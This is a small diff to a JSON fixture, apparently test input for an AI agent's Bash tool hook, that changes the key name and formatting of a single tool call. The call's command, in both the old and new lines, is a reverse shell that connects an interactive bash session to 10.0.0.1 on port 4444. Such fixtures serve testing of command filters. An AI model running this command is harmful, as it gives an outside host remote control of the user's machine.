@@ -1,1 +1,6 @@
-{"tool_name":"Bash","input":{"command":"bash -i >& /dev/tcp/10.0.0.1/4444"}}
+{
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "bash -i >& /dev/tcp/10.0.0.1/4444"
+  }
+}
